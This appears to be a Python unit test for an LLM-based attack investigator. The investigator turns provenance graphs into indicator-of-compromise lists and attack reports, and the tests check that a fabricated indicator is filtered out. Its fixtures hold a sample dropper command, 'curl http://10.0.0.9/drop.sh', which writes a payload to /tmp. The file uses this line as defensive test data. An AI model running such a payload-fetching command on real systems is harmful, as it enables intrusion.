import json
import unittest

import networkx as nx

from src.analysis.attack_investigator import LocalAttackVectorStore, generate_attack_report
from src.analysis.llm_client import LLMClient


class ScriptedLLM(LLMClient):
    def __init__(self, responses):
        self.responses = list(responses)
        self.prompts = []

    def generate_report(self, prompt: str) -> str:
        self.prompts.append(prompt)
        if self.responses:
            return self.responses.pop(0)
        return "{}"


def _graph():
    g = nx.MultiDiGraph()
    g.add_node("proc:a", meta={"name": "curl", "pathname": "/usr/bin/curl", "command": "curl http://10.0.0.9/drop.sh"})
    g.add_node("file:/tmp/drop.sh", meta={"pathname": "/tmp/drop.sh", "name": "/tmp/drop.sh"})
    g.add_node("net:10.0.0.9:80", meta={"dst_ip": "10.0.0.9", "dst_port": 80, "name": "10.0.0.9:80"})
    g.add_edge("proc:a", "net:10.0.0.9:80", type="Send", event_name="connect", count=1, first_ts=10, last_ts=10)
    g.add_edge("net:10.0.0.9:80", "proc:a", type="Receive", event_name="recvfrom", count=1, first_ts=11, last_ts=11)
    g.add_edge("proc:a", "file:/tmp/drop.sh", type="Write", event_name="write", count=2, first_ts=12, last_ts=12)
    return g


def _subgraph():
    return {
        "subgraph_id": "asg_0001",
        "nodes": [
            {"node_id": "proc:a", "node_type": "process", "display_name": "curl", "meta": {"name": "curl", "pathname": "/usr/bin/curl", "command": "curl http://10.0.0.9/drop.sh"}, "score": 12.0, "is_anomalous": True, "role": "anomalous"},
            {"node_id": "file:/tmp/drop.sh", "node_type": "file", "display_name": "/tmp/drop.sh", "meta": {"pathname": "/tmp/drop.sh"}, "score": 0.0, "is_anomalous": False, "role": "context_bridge"},
            {"node_id": "net:10.0.0.9:80", "node_type": "network", "display_name": "10.0.0.9:80", "meta": {"dst_ip": "10.0.0.9", "dst_port": 80}, "score": 0.0, "is_anomalous": False, "role": "context_bridge"},
        ],
        "edges": [
            {"src": "proc:a", "dst": "net:10.0.0.9:80", "event_type": "Send", "type": "Send", "event_name": "connect", "count": 1, "first_ts": 10, "last_ts": 10, "direction": "src_to_dst"},
            {"src": "net:10.0.0.9:80", "dst": "proc:a", "event_type": "Receive", "type": "Receive", "event_name": "recvfrom", "count": 1, "first_ts": 11, "last_ts": 11, "direction": "src_to_dst"},
            {"src": "proc:a", "dst": "file:/tmp/drop.sh", "event_type": "Write", "type": "Write", "event_name": "write", "count": 2, "first_ts": 12, "last_ts": 12, "direction": "src_to_dst"},
        ],
        "anomalous_node_ids": ["proc:a", "file:/tmp/drop.sh"],
        "normal_bridge_node_ids": ["net:10.0.0.9:80"],
        "node_count": 3,
        "edge_count": 3,
        "score": 12.0,
        "abnormality_level": "moderate",
        "seed_nodes": ["proc:a"],
        "time_start": 10,
        "time_end": 12,
        "construction_reason": "test",
    }


class AttackInvestigatorTest(unittest.TestCase):
    def test_full_pipeline_filters_fabricated_ioc_and_returns_context(self) -> None:
        llm = ScriptedLLM(
            [
                json.dumps({"iocs": {"ip": ["10.0.0.9", "8.8.8.8"], "file": ["/tmp/drop.sh"], "process": ["curl"], "command": ["curl http://10.0.0.9/drop.sh"], "domain": [], "hash": []}}),
                json.dumps(
                    {
                        "summary": "curl contacts 10.0.0.9 and writes /tmp/drop.sh",
                        "timeline": ["10 proc:a Send net:10.0.0.9:80", "12 proc:a Write file:/tmp/drop.sh"],
                        "involved_entities": ["curl", "/tmp/drop.sh", "10.0.0.9:80"],
                        "suspicious_behaviors": ["outbound contact", "dropper write"],
                        "possible_apt_stages": ["execution", "command_and_control"],
                        "evidence_references": ["log_asg_0001"],
                        "report_text": "Grounded subgraph report",
                    }
                ),
                json.dumps(
                    {
                        "ip": {"value": "10.0.0.9", "reason": "observed outbound peer"},
                        "process": {"value": "curl", "reason": "initiating process"},
                        "file": {"value": "/tmp/drop.sh", "reason": "written payload"},
                    }
                ),
            ]
        )
        result = generate_attack_report(
            _graph(),
            [_subgraph()],
            llm,
            LocalAttackVectorStore(),
            {"rag_top_k_bbk": 2, "rag_top_k_tik": 2, "max_context_hops": 1},
        )
        self.assertIn("asg_0001", result["iocs_by_subgraph"])
        self.assertIn("10.0.0.9", result["iocs_by_subgraph"]["asg_0001"]["ip"])
        self.assertNotIn("8.8.8.8", result["iocs_by_subgraph"]["asg_0001"]["ip"])
        self.assertTrue(result["subgraph_reports"])
        self.assertIn("Attack Report", result["comprehensive_report"])
        self.assertTrue(result["ioc_context_subgraphs"])
        self.assertIn("Context Enrichment", result["enriched_report"])

    def test_empty_attack_subgraphs_returns_no_attack_report(self) -> None:
        result = generate_attack_report(_graph(), [], ScriptedLLM([]), LocalAttackVectorStore(), {})
        self.assertEqual("no_attack_report", result["comprehensive_report"])
        self.assertEqual([], result["subgraph_reports"])


if __name__ == "__main__":
    unittest.main()
